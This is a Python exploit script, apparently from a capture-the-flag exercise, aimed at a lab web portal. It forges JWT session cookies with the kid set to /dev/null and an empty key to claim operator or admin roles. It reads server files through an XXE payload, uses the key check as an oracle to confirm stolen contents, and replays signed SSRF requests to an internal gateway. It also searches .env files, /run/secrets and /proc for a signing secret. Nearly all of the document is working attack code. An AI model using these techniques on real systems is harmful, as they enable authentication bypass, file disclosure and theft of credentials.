#!/usr/bin/env python3
"""round71 — Forged session cookie (operator/admin) + full portal + SSRF ideas"""
import requests, json, time, hashlib, hmac as hm, base64

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
    if r.status_code == 200:
        data = json.loads(r.text)
        return 200, data.get("summary", data.get("ticket", {})).get(field, "")
    return r.status_code, r.text

# ============================================================
print("="*70)
print("PHASE 1: FORGE OPERATOR SESSION COOKIE → PORTAL")
print("="*70)
print("  Real session cookie uses kid='carrier' + carrier key")
print("  We forge kid='/dev/null' + empty key → any role")

import re

for role in ["carrier", "operator", "admin", "root", "superadmin", "probe"]:
    forged_cookie = jwt_forged(role=role, sub="1337", company="CTF_Admin", kid="/dev/null")
    S = requests.Session()
    S.cookies.set("session", forged_cookie)

    # Try portal
    try:
        r = S.get(f"{CASPI}/portal", timeout=10)
        print(f"\n  [{r.status_code}] /portal as {role} ({len(r.text)} bytes):")

        if r.status_code == 200:
            # Print FULL page content
            text = r.text

            # Extract important elements
            apis = re.findall(r'/api/[a-zA-Z0-9/_?&=.-]+', text)
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', text)
            scripts = re.findall(r'<script[^>]*(?:src=["\']([^"\']+)["\'])?[^>]*>(.*?)</script>', text, re.DOTALL)
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', text)
            buttons = re.findall(r'<button[^>]*>(.*?)</button>', text, re.DOTALL)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', text)

            if apis: print(f"    APIs: {apis}")
            if forms: print(f"    Forms: {forms}")
            if buttons: print(f"    Buttons: {[b.strip()[:50] for b in buttons]}")
            if inputs: print(f"    Inputs: {inputs}")

            # Check for interesting keywords
            keywords_found = []
            for kw in ['probe', 'secret', 'flag', 'shell', 'llehs', 'admin',
                       'config', 'gauge', 'device', 'sign', 'hmac', 'key',
                       'custody', 'ticket', 'tank', 'meter', 'loading']:
                if kw.lower() in text.lower():
                    keywords_found.append(kw)
            if keywords_found:
                print(f"    Keywords: {keywords_found}")

            # Print interesting parts (not the boilerplate header)
            # Find the <main> section
            main_match = re.search(r'<main>(.*?)</main>', text, re.DOTALL)
            if main_match:
                main_content = main_match.group(1)
                print(f"\n    === MAIN CONTENT ({len(main_content)} bytes) ===")
                # Clean HTML tags for readability
                clean = re.sub(r'<[^>]+>', ' ', main_content)
                clean = re.sub(r'\s+', ' ', clean).strip()
                print(f"    {clean[:2000]}")
            else:
                # Print full page
                print(f"\n    === FULL PAGE ===")
                print(text[:3000])
                if len(text) > 3000:
                    print(f"    ... ({len(text)-3000} more bytes)")

        elif r.status_code in [302, 301]:
            print(f"    Redirect: {r.headers.get('Location', 'unknown')}")
        else:
            print(f"    {r.text[:300]}")

    except Exception as e:
        print(f"  Error as {role}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: EXPLORE ALL ENDPOINTS WITH OPERATOR SESSION COOKIE")
print("="*70)

S_op = requests.Session()
S_op.cookies.set("session", jwt_forged(role="operator", sub="1337",
                                        company="CTF_Admin", kid="/dev/null"))

endpoints = [
    # Portal variants
    "/portal", "/portal/probe", "/portal/custody", "/portal/tanks",
    "/portal/devices", "/portal/admin", "/portal/config",
    "/portal/settings", "/portal/profile",
    # Dashboard
    "/dashboard", "/dashboard/",
    # Admin
    "/admin", "/admin/", "/admin/config", "/admin/users",
    "/admin/secrets", "/admin/probe",
    # API with cookies (not JWT header)
    "/api/ops/probe/sign?device=lm-01",
    "/api/ops/probe/devices",
    "/api/ops/probe/list",
    "/api/ops/probe/config",
    "/api/ops/probe/secret",
    "/api/ops/custody/list",
    "/api/ops/custody/tickets",
    "/api/ops/tanks",
    "/api/ops/meters",
    "/api/ops/devices",
    "/api/ops/config",
    "/api/ops/gauge",
    "/api/admin/probe",
    "/api/admin/config",
    "/api/admin/secret",
    "/api/config",
    "/api/secret",
    "/api/probe",
    # Partner portal paths
    "/partner", "/partner/",
    "/carrier", "/carrier/",
    "/operator", "/operator/",
    # Routes discovery
    "/sitemap", "/sitemap.xml", "/robots.txt",
    "/.well-known/security.txt",
]

found_endpoints = []
for path in endpoints:
    try:
        r = S_op.get(f"{CASPI}{path}", timeout=5, allow_redirects=False)
        if r.status_code not in [404]:
            print(f"  [{r.status_code}] {path}: {r.text[:200]}")
            found_endpoints.append(path)
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: PROBE WITH FORGED COOKIE (not JWT header)")
print("="*70)

# Can we use probe via cookie-based auth?
S_op2 = requests.Session()
S_op2.cookies.set("session", jwt_forged(role="operator", sub="1337",
                                         company="CTF_Admin", kid="/dev/null"))

try:
    r = S_op2.get(f"{CASPI}/api/ops/probe/sign", params={"device": "lm-01"}, timeout=5)
    print(f"  probe/sign via cookie: [{r.status_code}] {r.text[:300]}")
except Exception as e:
    print(f"  Error: {e}")

try:
    probe_data = {
        "url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
        "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
    }
    r = S_op2.post(f"{CASPI}/api/ops/probe", json=probe_data, timeout=5)
    print(f"  probe via cookie: [{r.status_code}] {r.text[:300]}")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: PROBE SECRET FROM GUNICORN.CONF.PY + DB.PY")
print("="*70)
print("  Re-read with FIXED extraction to verify we have complete files")

for f in ["/app/gunicorn.conf.py", "/app/db.py"]:
    code, val = xxe_read(f)
    print(f"\n  {f} ({len(val) if val else 0} bytes):")
    if val:
        print(val)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: KID ORACLE — VERIFY KNOWN FILE CONTENTS")
print("="*70)
print("  Verify gunicorn.conf.py and db.py content via kid oracle")
print("  to confirm our XXE reads are COMPLETE (no truncation)")

for filepath in ["/app/gunicorn.conf.py", "/app/db.py"]:
    code, content = xxe_read(filepath)
    if not content:
        print(f"  {filepath}: empty!")
        continue

    # Test with and without trailing newline
    for suffix in ['', '\n']:
        key = (content + suffix).encode('utf-8')
        token = jwt_forged(role="operator", kid=filepath, key=key)
        try:
            r = requests.get(f"{CASPI}/api/auth/me",
                           headers={"Authorization": f"Bearer {token}"}, timeout=5)
            if r.status_code == 200:
                print(f"  {filepath} VERIFIED (newline={bool(suffix)})")
                break
        except:
            pass
    else:
        print(f"  {filepath}: CONTENT MISMATCH — our copy is incomplete!")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: KID ORACLE BRUTE — COMMON PROBE_SECRET VALUES")
print("="*70)
print("  Testing /proc/self/environ is impractical (too many unknowns)")
print("  But what about JUST the PROBE_SECRET env var value?")
print("  If there's a file containing ONLY the secret...")
print()
print("  Testing kid=/app/keys/probe (confirmed exists via kid) with")
print("  content = known HMAC key that would produce our probe sigs")

# From the probe mechanism:
# sig = HMAC(PROBE_SECRET, url)
# If PROBE_SECRET is in a file, kid oracle reads that file as HMAC key
#
# But kid oracle verifies: HMAC(file_content, jwt_unsigned) == jwt_sig
# This is different from: HMAC(file_content, probe_url) == probe_sig
#
# We can't directly test PROBE_SECRET this way unless we know
# the HMAC(file_content, jwt_unsigned) for our specific JWT.
#
# HOWEVER: what if we construct a JWT where the unsigned part = probe_url?
# Then: HMAC(file_content, probe_url) needs to equal our JWT sig
# And if file_content == PROBE_SECRET, then:
# HMAC(PROBE_SECRET, probe_url) = probe_sig = our JWT sig
#
# So we set jwt_sig = probe_sig and unsigned part = probe_url!
# But unsigned part = b64u(header) + "." + b64u(payload)
# This won't equal the probe URL...
#
# UNLESS we craft the JWT manually!

print("  Attempting JWT forgery where unsigned_part ≈ probe_url...")

probe_url = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
probe_sig_hex = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
probe_sig_bytes = bytes.fromhex(probe_sig_hex)
probe_sig_b64 = b64u(probe_sig_bytes)

# The URL has ONE dot: gauge-gw.internal
# Split: part1 = "http://gauge-gw", part2 = "internal:9100/v1/meters/loading-arm-1/flow"
# These are NOT valid base64, so standard JWT parsing would fail.
# But maybe the app does minimal parsing...

raw_jwt = f"{probe_url}.{probe_sig_b64}"
print(f"  Raw JWT: {raw_jwt[:80]}...")

# Test with this as Authorization Bearer
try:
    r = requests.get(f"{CASPI}/api/auth/me",
                    headers={"Authorization": f"Bearer {raw_jwt}"}, timeout=5)
    print(f"  Bearer raw_jwt: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  Error: {e}")

# Also test as session cookie
try:
    r = requests.get(f"{CASPI}/portal",
                    cookies={"session": raw_jwt}, timeout=5)
    print(f"  Cookie raw_jwt: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  Error: {e}")

# What if we encode the probe URL as base64url parts?
# Make header = {"alg":"HS256","typ":"JWT","kid":"/app/keys/carrier"}
# Then the unsigned part = b64u(header) + "." + b64u(payload)
# NOT the probe URL. So this approach fundamentally can't work.

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: EXPLORE gauge-gw DIRECTLY VIA PROBE")
print("="*70)
print("  We can probe 5 known URLs. Let's extract maximum info.")

probes = [
    ("lm-01", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    ("tk-01", "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
    ("tk-02", "http://gauge-gw.internal:9100/v1/tanks/2/level",
     "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197"),
    ("tk-03", "http://gauge-gw.internal:9100/v1/tanks/3/level",
     "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3"),
    ("tk-07", "http://gauge-gw.internal:9100/v1/tanks/7/level",
     "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f"),
]

for device, url, sig in probes:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json={"url": url, "sig": sig},
                         headers=AUTH_OP, timeout=10)
        print(f"  {device}: [{r.status_code}] {r.text}")
    except Exception as e:
        print(f"  {device}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: SEARCH FOR PROBE_SECRET IN ALTERNATIVE LOCATIONS")
print("="*70)

# Files that might contain the secret but we haven't tried
alt_paths = [
    # Possible config from Docker
    "/app/config.json",
    "/app/config.yaml",
    "/app/config.yml",
    "/app/config.toml",
    "/app/config.ini",
    "/app/settings.json",
    "/app/settings.yaml",
    "/app/.env",
    # Docker-injected
    "/run/secrets/PROBE_SECRET",
    "/run/secrets/probe_secret",
    "/var/run/secrets/PROBE_SECRET",
    # Environment file
    "/app/env",
    "/app/.docker-env",
    # Alternative key locations
    "/app/keys/hmac_secret",
    "/app/keys/probe_key",
    "/app/keys/sign",
    "/app/keys/signing_key",
    "/etc/secret",
    "/etc/probe",
    "/tmp/probe_secret",
    "/tmp/secret",
    # Volume-mounted secrets
    "/var/local/secret",
    "/var/local/probe",
    "/var/local/probe_secret",
    # Process-specific
    "/proc/1/cmdline",  # Will have null bytes → 400 if exists
    "/proc/1/comm",     # Just process name, no null bytes
]

for path in alt_paths:
    code, val = xxe_read(path)
    if code == 200 and val:
        print(f"  *** FOUND: {path} ({len(val)} bytes): {val[:200]} ***")
        # Test as PROBE_SECRET
        probe_url_b = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
        probe_sig_b = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")
        for k in [val.encode(), val.strip().encode(), val.encode() + b'\n']:
            if hm.new(k, probe_url_b, hashlib.sha256).digest() == probe_sig_b:
                print(f"  *** !!! PROBE_SECRET = {val!r} !!! ***")
    elif code == 400:
        print(f"  EXISTS (binary): {path}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: READ app.css FULLY + CHECK FOR HIDDEN COMMENTS")
print("="*70)

code, css = xxe_read("/app/static/css/app.css")
if css:
    print(f"  app.css ({len(css)} bytes):")
    # Check for comments with secrets
    import re
    comments = re.findall(r'/\*(.*?)\*/', css, re.DOTALL)
    for c in comments:
        if any(kw in c.lower() for kw in ['secret', 'probe', 'key', 'flag', 'todo', 'hack', 'password']):
            print(f"  *** INTERESTING CSS COMMENT: {c.strip()[:200]} ***")

    # Print last 500 bytes (might have hidden comments)
    print(f"  Last 500 chars: ...{css[-500:]}")

print("\n"+"="*70)
print("DONE")
print("="*70)
